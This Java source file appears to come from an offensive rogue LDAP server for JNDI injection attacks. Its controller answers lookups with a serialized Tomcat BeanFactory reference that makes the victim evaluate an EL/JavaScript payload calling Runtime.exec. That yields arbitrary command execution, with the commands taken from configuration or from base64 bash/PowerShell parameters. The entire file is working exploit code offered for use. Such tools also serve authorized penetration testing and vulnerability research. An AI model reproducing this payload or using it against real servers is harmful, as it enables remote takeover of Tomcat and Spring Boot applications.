package artsploit.controllers;

import artsploit.Config;
import artsploit.Utilities;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.makeJavaScriptString;
import static artsploit.Utilities.serialize;
import static artsploit.Utilities.createB64Payload;
import static artsploit.Utilities.convertBytesToHex;

/**
 * Yields:
 *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
 *
 * Requires:
 *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit
 */
@LdapMapping(uri = { "/o=tomcat", "/o=tomcat,pwshb64cmd=*", "/o=tomcat,bashb64cmd=*" })
public class Tomcat implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        String commandStr;
        String commandParam;
        if(base.contains("pwshb64cmd=")) {
            commandParam = Utilities.getDnParam(result.getRequest().getBaseDN(), "pwshb64cmd");
            commandStr = createB64Payload("pwsh",commandParam);
        } else if(base.contains("bashb64cmd=")) {
            commandParam = Utilities.getDnParam(result.getRequest().getBaseDN(), "bashb64cmd");
            commandStr = createB64Payload("bash",commandParam);
        } else {
            commandStr = Config.command;
        }

        String payload = ("{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
            "}")
            .replace("${command}", makeJavaScriptString(commandStr));

        System.out.println("[*] Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
        System.out.println("[+] Command to Execute:");
        System.out.println(commandStr);

        System.out.println("[+] Javascript Payload:");
        System.out.println(payload);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));

        byte[] serPayload = serialize(ref);
        e.addAttribute("javaSerializedData", serPayload);

        System.out.println("[+] Java Serialized Payload (Hex):");
        System.out.println(convertBytesToHex(serPayload));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}